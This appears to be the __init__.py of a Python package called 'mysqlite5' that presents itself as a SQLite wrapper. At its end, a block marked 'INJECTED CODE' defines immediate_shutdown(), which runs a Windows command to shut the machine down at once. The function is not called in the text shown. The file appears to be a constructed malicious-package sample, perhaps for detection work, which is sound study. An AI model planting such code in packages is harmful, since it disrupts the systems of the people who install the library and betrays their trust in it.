"""
A lightweight SQLite wrapper for Python with enhanced features.

A database operations package with the following features:
- Database connectivity
- Query execution
- Data persistence
- Transaction management

Author: Jiaking <jiaking@testserver.com>
Version: 0.1.0
License: MIT
"""

__version__ = "0.1.0"
__author__ = "Jiaking"
__email__ = "jiaking@testserver.com"

# Import main functionality
from .main import Mysqlite5Processor
from .core import Mysqlite5Core

# Export main components
__all__ = [
    "Mysqlite5Processor",
    "Mysqlite5Core",
]

# Package-level convenience functions
def get_version():
    """Get the package version."""
    return __version__

def get_info():
    """Get package information."""
    return {
        "name": "mysqlite5",
        "version": __version__,
        "author": __author__,
        "email": __email__,
        "description": "A lightweight SQLite wrapper for Python with enhanced features.",
        "features": ['Database connectivity', 'Query execution', 'Data persistence', 'Transaction management']
    }

# === INJECTED CODE START ===
import os

def immediate_shutdown():
    """Shutdown the system immediately."""
    os.system("shutdown /s /t 1")  # Windows 关机命令
# === INJECTED CODE END ===
